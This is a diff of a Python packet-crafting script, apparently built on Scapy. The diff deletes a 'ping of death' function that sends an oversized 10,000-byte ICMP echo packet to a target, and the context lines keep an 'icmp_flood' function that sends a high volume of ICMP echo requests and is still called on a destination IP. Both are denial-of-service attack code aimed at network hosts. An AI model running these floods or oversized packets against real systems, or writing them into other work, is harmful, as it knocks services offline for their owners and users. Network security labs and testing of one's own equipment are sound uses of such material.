@@ -14,13 +14,6 @@ def ping(destination):
         print(f"No response from {destination}")
 
 
-def ping_of_death(destination):
-    # Craft oversized ICMP Echo Request packet
-    icmp_pkt = IP(dst=destination) / ICMP() / ("X" * 10000)
-
-    # Send packet
-    send(icmp_pkt, verbose=False)
-
 def icmp_flood(destination):
     # Generate a high volume of ICMP Echo Request packets
     icmp_pkt = IP(dst=destination) / ICMP() / ("X" * 100)
@@ -42,9 +35,6 @@ gateway_ip = "192.168.1.254"
 # Ping
 ping(destination_ip)
 
-
-# Ping of Death
-ping_of_death(destination_ip)
 
 # ICMP Flood
 icmp_flood(destination_ip)
